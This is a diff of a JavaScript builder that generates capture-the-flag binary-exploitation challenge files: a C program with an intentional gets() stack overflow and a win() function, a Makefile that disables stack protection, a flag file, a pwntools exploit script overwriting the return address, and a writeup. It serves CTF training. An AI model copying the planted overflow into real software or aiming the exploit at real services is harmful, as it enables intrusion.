@@ -1,31 +1,43 @@
 /**
  * Binary Exploitation (Pwn) — category-specific builder.
- * Phase 1: returns mock challenge files.
+ * Mock implementation that uses the REAL spec data (flag, name, exploit path).
+ * Phase 3: will call Claude API with prompt.md like web/forensics builders.
  */
 export default {
   categoryId: 'pwn',
 
   async build(spec) {
     const name = spec.challengeName || spec.challenge_name || 'Pwn Challenge';
-    const flag = spec.flags?.[0] || 'Exploit3rs{pwn_d3f4ult}';
-    const narrative = spec.narrative || 'Exploit the binary vulnerability to capture the flag.';
+    const flag = spec.flag || (Array.isArray(spec.flags) && spec.flags[0]) || null;
+    if (!flag) throw new Error('Pwn builder: spec has no flag');
+
+    const narrative = spec.narrative || 'Exploit the binary vulnerability.';
     const difficulty = spec.difficulty || 'medium';
     const points = spec.points || 300;
+    const exploitPath = spec.exploitPath || ['Analyze the binary', 'Find the vulnerability', 'Craft exploit'];
+    const techStack = spec.techStack || ['C', 'GCC', 'pwntools'];
+    const antiAi = spec.antiAiCountermeasures || [];
 
-    return [
-      {
-        path: 'vuln.c',
-        language: 'c',
-        content: `/*
+    return {
+      files: [
+        {
+          path: 'vuln.c',
+          language: 'c',
+          content: `/*
  * ${name} - Vulnerable Binary
- * Compile: gcc -o vuln vuln.c -fno-stack-protector -no-pie
+ * Tech stack: ${techStack.join(', ')}
+ * Difficulty: ${difficulty}
+ *
+ * Exploit path:
+${exploitPath.map((s, i) => ` *   ${i + 1}. ${s}`).join('\n')}
  */
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
 
+// TODO: Phase 3 will generate a real vulnerable binary matching the spec
 void win() {
-    char flag[64];
+    char flag[128];
     FILE *f = fopen("flag.txt", "r");
     if (f) {
         fgets(flag, sizeof(flag), f);
@@ -36,9 +48,9 @@ void win() {
 
 void vuln() {
     char buf[64];
-    printf("Enter your name: ");
-    gets(buf);  // Classic buffer overflow
-    printf("Hello, %s!\\n", buf);
+    printf("Enter input: ");
+    gets(buf);
+    printf("You said: %s\\n", buf);
 }
 
 int main() {
@@ -47,12 +59,13 @@ int main() {
     printf("=== ${name} ===\\n");
     vuln();
     return 0;
-}`,
-      },
-      {
-        path: 'Makefile',
-        language: 'makefile',
-        content: `CC=gcc
+}
+`,
+        },
+        {
+          path: 'Makefile',
+          language: 'makefile',
+          content: `CC=gcc
 CFLAGS=-fno-stack-protector -no-pie -z execstack
 TARGET=vuln
 
@@ -62,50 +75,42 @@ $(TARGET): vuln.c
 \t$(CC) $(CFLAGS) -o $(TARGET) vuln.c
 
 clean:
-\trm -f $(TARGET)`,
-      },
-      {
-        path: 'Dockerfile',
-        language: 'dockerfile',
-        content: `FROM ubuntu:22.04
-RUN apt-get update && apt-get install -y gcc socat && rm -rf /var/lib/apt/lists/*
-WORKDIR /challenge
-COPY vuln.c Makefile flag.txt ./
-RUN make
-RUN chmod +x vuln
-EXPOSE 9999
-CMD ["socat", "TCP-LISTEN:9999,reuseaddr,fork", "EXEC:./vuln"]`,
-      },
-      {
-        path: 'flag.txt',
-        language: 'text',
-        content: flag,
-      },
-      {
-        path: 'exploit.py',
-        language: 'python',
-        content: `#!/usr/bin/env python3
+\trm -f $(TARGET)
+`,
+        },
+        {
+          path: 'flag.txt',
+          language: 'text',
+          content: flag,
+        },
+        {
+          path: 'exploit.py',
+          language: 'python',
+          content: `#!/usr/bin/env python3
 """Exploit for ${name}"""
+# Exploit path:
+${exploitPath.map((s, i) => `# Step ${i + 1}: ${s}`).join('\n')}
+
 from pwn import *
+import sys
 
 TARGET = sys.argv[1] if len(sys.argv) > 1 else "localhost"
 PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 9999
 
 elf = ELF("./vuln")
 win_addr = elf.symbols["win"]
-
 print(f"[*] win() at {hex(win_addr)}")
-print(f"[*] Connecting to {TARGET}:{PORT}")
 
 r = remote(TARGET, PORT)
 payload = b"A" * 72 + p64(win_addr)
-r.sendlineafter(b"name: ", payload)
-r.interactive()`,
-      },
-      {
-        path: 'writeup.md',
-        language: 'markdown',
-        content: `# ${name} - Writeup
+r.sendlineafter(b"input: ", payload)
+r.interactive()
+`,
+        },
+        {
+          path: 'writeup.md',
+          language: 'markdown',
+          content: `# ${name} - Writeup
 
 ## Challenge Description
 ${narrative}
@@ -113,16 +118,19 @@ ${narrative}
 ## Difficulty
 ${difficulty} (${points} points)
 
-## Solution
-1. Analyze the binary — identify the buffer overflow in \`vuln()\`
-2. Find the \`win()\` function address using \`objdump\` or \`pwntools\`
-3. Calculate offset to return address (72 bytes)
-4. Craft payload: padding + win() address
-5. Send payload to overwrite return address and redirect execution
+## Tech Stack
+${techStack.map((t) => `- ${t}`).join('\n')}
 
+## Solution
+${exploitPath.map((s, i) => `${i + 1}. ${s}`).join('\n')}
+${antiAi.length > 0 ? `\n## Anti-AI Measures\n${antiAi.map((m) => `- ${m}`).join('\n')}\n` : ''}
 ## Flag
-\`${flag}\``,
-      },
-    ];
+\`${flag}\`
+`,
+        },
+      ],
+      tokenUsage: 0,
+      durationMs: 0,
+    };
   },
 };
